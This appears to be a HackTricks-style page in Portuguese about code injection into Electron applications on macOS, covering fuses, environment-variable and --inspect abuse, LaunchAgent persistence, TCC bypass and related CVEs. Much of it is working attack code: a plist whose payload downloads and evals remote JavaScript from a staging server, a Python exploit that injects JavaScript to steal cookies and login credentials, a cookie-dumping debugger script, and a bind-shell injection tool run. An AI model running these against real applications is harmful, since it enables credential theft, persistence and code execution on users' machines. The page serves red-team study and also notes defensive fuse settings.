# Injeção em Aplicações Electron no macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informações básicas

Se você não sabe o que é Electron, pode encontrar [**muitas informações aqui**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Mas, por enquanto, basta saber que Electron executa **node**.\
E node possui alguns **parâmetros** e **variáveis de ambiente** que podem ser usadas para **fazê-lo executar outro código**, além do arquivo indicado.

### Electron Fuses

Essas técnicas serão discutidas a seguir, mas recentemente o Electron adicionou vários **security flags** para evitá-las. Esses são os [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), e estes são os usados para **impedir que** aplicações Electron no macOS **carreguem código arbitrário**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Se desabilitado, impede o uso da variável de ambiente **`ELECTRON_RUN_AS_NODE`** para injetar código.
- **`EnableNodeCliInspectArguments`**: Se desabilitado, parâmetros como `--inspect` e `--inspect-brk` não serão respeitados, evitando essa forma de injetar código.
- **`EnableEmbeddedAsarIntegrityValidation`**: Se habilitado, o **arquivo** **`asar`** carregado será **validado** pelo macOS, **impedindo**, dessa forma, a **injeção de código** por meio da modificação do conteúdo desse arquivo.
- **`OnlyLoadAppFromAsar`**: Se estiver habilitado, em vez de procurar para carregar na seguinte ordem: **`app.asar`**, **`app`** e, por fim, **`default_app.asar`**, ele verificará e usará apenas `app.asar`, garantindo assim que, quando **combinado** com o fuse **`embeddedAsarIntegrityValidation`**, seja **impossível** **carregar código não validado**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Se habilitado, o processo do navegador usará o arquivo chamado `browser_v8_context_snapshot.bin` para seu snapshot do V8.

Outro fuse interessante que não impedirá a injeção de código é:

- **EnableCookieEncryption**: Se habilitado, o armazenamento de cookies em disco será criptografado usando chaves de criptografia no nível do sistema operacional.

### Verificando Electron Fuses

Você pode **verificar essas flags** a partir de uma aplicação com:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificando Electron Fuses

Como a [**documentação menciona**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), a configuração dos **Electron Fuses** é armazenada dentro do **binário do Electron**, que contém em algum lugar a string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

Em aplicações macOS, isso normalmente está em `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Você pode carregar este arquivo em [https://hexed.it/](https://hexed.it/) e pesquisar a string anterior. Depois dessa string, você verá em ASCII um número "0" ou "1" indicando se cada fuse está desabilitado ou habilitado. Basta modificar o código hexadecimal (`0x30` é `0` e `0x31` é `1`) para **modificar os valores dos fuses**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Observe que, se você tentar **sobrescrever** o binário **`Electron Framework`** dentro de um aplicativo com esses bytes modificados, o app não será executado.

## RCE adicionando código a Electron Applications

Pode haver **arquivos JS/HTML externos** que um Electron App utiliza. Assim, um atacante poderia injetar código nesses arquivos, cuja assinatura não será verificada, e executar código arbitrário no contexto do app.

> [!CAUTION]
> No entanto, no momento existem 2 limitações:
>
> - A permissão **`kTCCServiceSystemPolicyAppBundles`** é **necessária** para modificar um App, portanto, por padrão, isso não é mais possível.
> - O arquivo **`asap`** compilado geralmente tem os fuses **`embeddedAsarIntegrityValidation`** e **`onlyLoadAppFromAsar`** habilitados.
>
> Tornando esse caminho de ataque mais complicado (ou impossível).

Observe que é possível contornar o requisito de **`kTCCServiceSystemPolicyAppBundles`** copiando o aplicativo para outro diretório (como **`/tmp`**), renomeando a pasta **`app.app/Contents`** para **`app.app/NotCon`**, **modificando** o arquivo **asar** com seu código **malicioso**, renomeando-a novamente para **`app.app/Contents`** e executando-o.<sup>[[5]](#references)</sup>

Você pode desempacotar o código do arquivo asar com:
```bash
npx asar extract app.asar app-decomp
```
E empacote-o novamente depois de modificá-lo com:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE com ELECTRON_RUN_AS_NODE

De acordo com [**a documentação**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), se essa variável de ambiente estiver definida, ela iniciará o processo como um processo normal do Node.js.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Se o **`RunAsNode`** estiver desativado, a variável de ambiente **`ELECTRON_RUN_AS_NODE`** será ignorada, e isso não funcionará.

### Injeção a partir do Plist do App

Como [**proposto aqui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), você poderia abusar dessa variável de ambiente em um plist para manter a persistência:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE com `NODE_OPTIONS`

Você pode armazenar o payload em um arquivo diferente e executá-lo:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Se o fuse **`EnableNodeOptionsEnvironmentVariable`** estiver **desativado**, o app **ignorará** a env var **NODE_OPTIONS** quando iniciado, a menos que a env var **`ELECTRON_RUN_AS_NODE`** esteja definida; ela também será **ignorada** se o fuse **`RunAsNode`** estiver desativado.
>
> Se você não definir **`ELECTRON_RUN_AS_NODE`**, encontrará o **erro**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection from the App Plist

Você pode abusar dessa env var em um plist para manter a persistência, adicionando estas chaves:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE com inspeção

De acordo com [**este artigo**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), se você executar uma aplicação Electron com flags como **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, uma **porta de debug será aberta**, permitindo que você se conecte a ela (por exemplo, pelo Chrome em `chrome://inspect`) e consiga **injetar código nela** ou até mesmo iniciar novos processos.<sup>[[7]](#references)</sup>\
Por exemplo:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
Em [**este blogpost**](https://hackerone.com/reports/1274695), essa depuração é abusada para fazer o chrome **headless baixar arquivos arbitrários em locais arbitrários**.<sup>[[8]](#references)</sup>

> [!TIP]
> Se um app tiver sua própria forma de verificar se variáveis de ambiente ou parâmetros como `--inspect` estão definidos, você pode tentar **bypass**-la em runtime usando o argumento `--inspect-brk`, que **interromperá a execução** no início do app e executará um bypass (sobrescrevendo os argumentos ou as variáveis de ambiente do processo atual, por exemplo).

A seguir, um exploit no qual, monitorando e executando o app com o parâmetro `--inspect-brk`, foi possível fazer bypass da proteção personalizada existente (sobrescrevendo os parâmetros do processo para remover `--inspect-brk`) e, em seguida, injetar um payload JS para extrair cookies e credenciais do app:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Se o fuse **`EnableNodeCliInspectArguments`** estiver desabilitado, o app **ignorará os parâmetros do node** (como `--inspect`) quando iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** esteja definida, que também será **ignorada** se o fuse **`RunAsNode`** estiver desabilitado.
>
> No entanto, ainda seria possível usar o **parâmetro do electron `--remote-debugging-port=9229`**, mas o payload anterior não funcionará para executar outros processos.

Usando o parâmetro **`--remote-debugging-port=9222`**, é possível roubar algumas informações do Electron App, como o **histórico** (com comandos GET) ou os **cookies** do navegador (como eles são **descriptografados** dentro do navegador e existe um **endpoint json** que os fornecerá).

Você pode aprender como fazer isso [**aqui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**aqui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e usar a ferramenta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ou um script simples como:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injeção a partir do App Plist

Você poderia abusar desta variável de ambiente em um plist para manter a persistência, adicionando estas chaves:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypass de TCC abusando de versões antigas

> [!TIP]
> O daemon TCC do macOS não verifica a versão executada do aplicativo. Portanto, se você **não conseguir injetar código em um aplicativo Electron** usando qualquer uma das técnicas anteriores, poderá baixar uma versão anterior do APP e injetar código nela, pois ela ainda obterá os privilégios do TCC (a menos que o Trust Cache impeça isso).

## Executar código não JS

As técnicas anteriores permitirão executar **código JS dentro do processo do aplicativo Electron**. No entanto, lembre-se de que os **processos filhos são executados sob o mesmo perfil de sandbox** do aplicativo pai e **herdam as permissões TCC** dele.\
Portanto, se quiser abusar de entitlements para acessar a câmera ou o microfone, por exemplo, você pode simplesmente **executar outro binário a partir do processo**.

## Vulnerabilidades notáveis do Electron para macOS (2023-2024)

### CVE-2023-44402 – bypass de integridade do ASAR

O Electron ≤22.3.23 e várias pré-versões das versões 23-27 permitiam que um atacante com acesso de escrita à pasta `.app/Contents/Resources` ignorasse os fuses `embeddedAsarIntegrityValidation` **e** `onlyLoadAppFromAsar`. O bug era uma *confusão de tipo de arquivo* no verificador de integridade, que permitia carregar um **diretório chamado `app.asar`** criado especialmente em vez do arquivo validado; assim, qualquer JavaScript colocado nesse diretório era executado quando o aplicativo era iniciado. Portanto, até mesmo fornecedores que haviam seguido as orientações de hardening e habilitado ambos os fuses continuavam vulneráveis no macOS.<sup>[[3]](#references)</sup>

Versões corrigidas do Electron: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** e **27.0.0-alpha.7**. Atacantes que encontrarem um aplicativo executando uma build antiga podem substituir `Contents/Resources/app.asar` pelo próprio diretório para executar código com os entitlements TCC do aplicativo.<sup>[[3]](#references)</sup>

### Cluster de CVEs de 2024 “RunAsNode” / “enableNodeCliInspectArguments”

Em janeiro de 2024, uma série de CVEs (CVE-2024-23738 a CVE-2024-23743) destacou que muitos aplicativos Electron são distribuídos com os fuses **RunAsNode** e **EnableNodeCliInspectArguments** ainda habilitados. Assim, um atacante local pode relançar o programa com a variável de ambiente `ELECTRON_RUN_AS_NODE=1` ou com flags como `--inspect-brk` para transformá-lo em um processo Node.js *genérico* e herdar todas as permissões de sandbox e TCC do aplicativo.<sup>[[4]](#references)</sup>

Embora a equipe do Electron tenha contestado a classificação como “crítica” e observado que o atacante já precisa de execução local de código, o problema continua sendo valioso durante o post-exploitation, pois transforma qualquer bundle vulnerável do Electron em um binário *living-off-the-land* que pode, por exemplo, ler Contatos, Fotos ou outros recursos sensíveis previamente concedidos ao aplicativo desktop.<sup>[[4]](#references)</sup>

Orientações defensivas dos mantenedores do Electron:<sup>[[4]](#references)</sup>

* Desabilite os fuses `RunAsNode` e `EnableNodeCliInspectArguments` em builds de produção.
* Use a API **UtilityProcess** mais recente se o aplicativo realmente precisar de um processo auxiliar Node.js, em vez de reabilitar esses fuses.

## Injeção automática

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

A ferramenta [**electroniz3r**](https://github.com/r3ggi/electroniz3r) pode ser facilmente usada para **encontrar aplicativos electron vulneráveis** instalados e injetar código neles. Essa ferramenta tentará usar a técnica **`--inspect`**:<sup>[[5]](#references)</sup>

Você precisa compilá-la por conta própria e pode usá-la assim:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

O Loki foi projetado para aplicar um backdoor em aplicações Electron, substituindo os arquivos JavaScript das aplicações pelos arquivos JavaScript de Command & Control do Loki.

## References

- [1] [Fuses do Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Injection no macOS via Frameworks de Terceiros - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Bypass de integridade do ASAR via confusão de tipo de arquivo (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Declaração sobre as CVEs de 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing a privacidade do macOS - Uma nova arma para seu Red Teaming - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Variáveis de ambiente | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Por que aplicações Electron não podem armazenar seus segredos confidencialmente: opção --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Relatório HackerOne #1274695 - Debugging do Electron abusado para baixar arquivos arbitrários](https://hackerone.com/reports/1274695)
- [9] [Mãos no pote de cookies: Dumping de Cookies com a Porta de Remote Debugger do Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging de falhas no Dumping de Cookies com o Remote Debugger do Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
